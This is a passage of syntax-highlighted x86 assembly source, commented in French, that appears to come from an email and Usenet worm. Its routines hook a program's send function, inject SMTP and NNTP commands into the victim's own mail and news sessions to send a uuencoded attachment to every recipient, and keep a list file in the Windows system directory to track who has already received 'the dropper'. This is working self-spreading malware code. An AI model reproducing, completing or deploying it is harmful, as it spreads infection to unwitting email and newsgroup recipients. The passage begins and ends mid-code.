</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;------ verifier s'il y a des rcpt</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_recipient</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;------ verifier s'il faut envoyer</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">faut_pas_envoyer_mail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">oh_puis_merde</span><span class="sc0">

</span><span class="sc1">;======================= tout est OK, on envoit le matériel ================================</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recuperer_socket_et_original_send</span><span class="sc0">      </span><span class="sc1">;nique ebx, eax, renvoie en mémoire</span><span class="sc0">

</span><span class="sc1">;-------- 1/ envoyer les headers du message </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_headers</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">         </span><span class="sc1">;HEADER</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uucode_et_envoie</span><span class="sc0">

</span><span class="sc1">;-------- 2/ envoyer le point final</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_point</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">point</span><span class="sc0">                   </span><span class="sc1">;"."</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 052"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;-------- 3/ envoyer la commande "reset"</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_smtp_rset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp_rset</span><span class="sc0">               </span><span class="sc1">;RSET</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 052"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;-------- 4/ envoyer from</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">smtp_sender_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_sender</span><span class="sc0">          </span><span class="sc1">;MAIL FROM:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 052"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;-------- 5/ envoyer autant de rcpt qu'il faut</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_recipient</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_sender</span><span class="sc0">          </span><span class="sc1">;limite haute</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">

</span><span class="sc5">cherche_rcpt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">cherche_fin_rcpt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">envoyer_data</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cherche_fin_rcpt</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">;RCPT</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 052"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cherche_rcpt</span><span class="sc0">

</span><span class="sc1">;-------- 6/ envoyer data</span><span class="sc0">

</span><span class="sc5">envoyer_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_smtp_data</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp_data</span><span class="sc0">           </span><span class="sc1">;DATA</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 453"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;========================== fin de la routine ==================================</span><span class="sc0">

</span><span class="sc5">oh_puis_merde</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">faut_pas_envoyer_mail</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fin_routine_mail_sans_dechargement_mais_vidage_des_rcpt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_recipient</span><span class="sc0">       </span><span class="sc1">;annuler les rcpt en memoire</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">fin_routine_mail_sans_dechargement</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;retour sans déchargement de ma dll</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fin_routine_mail_avec_dechargement</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MMMM"</span><span class="sc0">         </span><span class="sc1">;retour avec déchargement de ma dll</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mail</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                ROUTINE SEND NEWS                                    ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc5">news</span><span class="sc0">
</span><span class="sc5">news</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;----analyse les données de la commande send</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recuperer_offset_et_taille_envoi</span><span class="sc0">       </span><span class="sc1">;nique ebx, ecx, retourne ebx, ecx</span><span class="sc0">

</span><span class="sc1">;----- voir si ce qui est envoyé est une commande au serveur ou le corps d'un message</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">fin_routine_news_sans_dechargement</span><span class="sc0">

</span><span class="sc1">;================== ce n'est pas une commande, mais un gros send ===========================</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recupere_headers</span><span class="sc0">           </span><span class="sc1">;nique eax, retour eax=-1 si couille, 0 si OK</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_news_sans_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recuperer_socket_et_original_send</span><span class="sc0">  </span><span class="sc1">;nique abx, eax, renvoie en mémoire</span><span class="sc0">

</span><span class="sc1">;-------- 1/ envoyer les headers du message </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_headers</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_headers</span><span class="sc0">         </span><span class="sc1">;HEADER</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uucode_et_envoie</span><span class="sc0">

</span><span class="sc1">;-------- 2/ envoyer le point final</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_point</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">point</span><span class="sc0">                   </span><span class="sc1">;"."</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 042"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;-------- 3/ envoyer la commande "POST"</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_nntp_post</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nntp_post</span><span class="sc0">               </span><span class="sc1">;POST</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">envoie</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recoit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" 043"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc0">

</span><span class="sc1">;========================== fin de la routine ==================================</span><span class="sc0">

</span><span class="sc5">fin_routine_news_sans_dechargement</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;retour sans déchargement de ma dll</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fin_routine_news_avec_dechargement</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"NNNN"</span><span class="sc0">             </span><span class="sc1">;retour avec déchargement de ma dll</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">news</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***               VERIFIE SI LE DESTINATAIRE A DEJA RECU LE DROPPER                     ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">verifie_destinataire</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc1">;généralement C:\WINDOWS\SYSTEM</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop_verifie_destinataire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">liste_name</span><span class="sc0">      </span><span class="sc1">;concatenate "c:\windows\" and "list.ska"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">liste_name_size</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;handle of file with attributes to copy (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;file attributes (80h=FILE_ATTRIBUTE_NORMAL)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;how to create (4=OPEN_ALWAYS)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;address of security descriptor (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;share mode (0=Prevents the file from being shared)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">             </span><span class="sc1">;access (read-write) mode (080000000h=GENERIC_READ)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">  </span><span class="sc1">;address of name of the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop_verifie_destinataire</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">lit_le_fichier</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">liste_size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop_verifie_destinataire</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">liste_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">      </span><span class="sc1">;si le fichier est plus gros que 5 Ko</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">compare_names</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;on le remet à zero</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;how to create (2=CREATE_ALWAYS)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer2_system_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop_verifie_destinataire</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">liste_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">lit_le_fichier</span><span class="sc0">

</span><span class="sc5">compare_names</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset_mem_buffer</span><span class="sc0">      </span><span class="sc1">;esi=memoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">liste_size</span><span class="sc0">         </span><span class="sc1">;ecx=limite haute memoire</span><span class="sc0">

</span><span class="sc5">compare_8_premiers_cara</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">teste_4_8</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cherche_0D0A_suivant</span><span class="sc0">
</span><span class="sc5">teste_4_8</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">il_a_deja_recu_le_dropper</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">cherche_0D0A_suivant</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">cherche_0D0A</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
